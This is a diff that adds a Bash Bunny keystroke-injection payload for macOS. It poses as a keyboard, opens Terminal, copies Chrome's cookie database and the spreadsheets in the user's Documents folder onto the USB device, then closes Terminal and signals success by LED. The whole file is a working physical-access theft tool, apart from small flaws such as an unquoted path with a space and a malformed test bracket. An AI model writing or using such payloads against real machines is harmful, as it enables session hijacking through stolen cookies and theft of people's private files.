@@ -1,0 +1,33 @@
+LED R
+ATTACKMODE HID STORAGE
+QUACK GUI SPACE
+QUACK DELAY 1000
+QUACK STRING terminal
+QUACK ENTER
+QUACK DELAY 8000
+QUACK STRING mkdir -p /Volumes/BashBunny/MacLoot/xlsx
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING cat ~/Library/Application Support/Google/Chrome/Default/Cookies > /Volumes/BashBunny/MacLoot/chromecookies.db
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING cd ~/Documents && cp *.xlsx *.xls /Volumes/BashBunny/MacLoot/xlsx/
+QUACK ENTER
+QUACK DELAY 1000
+QUACK GUI q
+QUACK DELAY 500
+QUACK ENTER
+
+# Green LED for finished
+LED G
+
+files=$(ls /Volumes/BashBunny/MacLoot/xlsx/*.xls 2> /dev/null | wc -l)
+files2=$(ls /Volumes/BashBunny/MacLoot/xlsx/*.xlsx 2> /dev/null | wc -l)
+if [ "$files" != "0" -o "$files2" != "0"]
+then
+# Got spreadsheet files
+LED R B
+else
+LED R
+# No spread sheets
+fi
